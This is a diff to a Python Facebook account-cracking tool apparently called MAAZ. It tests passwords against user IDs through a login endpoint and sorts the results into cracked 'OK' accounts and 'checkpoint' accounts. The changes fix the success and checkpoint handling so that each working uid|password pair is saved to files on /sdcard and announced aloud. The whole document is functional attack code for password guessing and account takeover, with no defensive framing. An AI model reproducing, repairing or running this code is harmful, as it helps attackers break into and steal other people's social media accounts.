@@ -309,7 +309,7 @@ def main():
         "[\x1b[38;5;46m■■■■■■■■■\033[1;97m□]",
         "[\x1b[38;5;46m■■■■■■■■■■\033[1;97m]"
     ]
-    os.system('espeak -a 300 "Thanks for using MAAZ tools"')
+
     for i in range(30):
         time.sleep(0.1)
         sys.stdout.write(
@@ -458,13 +458,18 @@ def login1(uid):
                                headers=head,
                                allow_redirects=False,
                                verify=True).json()
-            if "session_key" in rp:            	
-                cps.append(uid)
-                break
-            elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/OLD_CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
+            if "session_key" in rp:
                 oks.append(uid)
+                open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw}\033[1;97m')
+                os.system('espeak -a 300 "OK ID found"')
+                break
+
+            elif "www.facebook.com" in rp['error']['message']:
+                cps.append(uid)
+                open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
+                os.system('espeak -a 300 "Checkpoint ID"')
                 break
             else:continue
         loop+=1
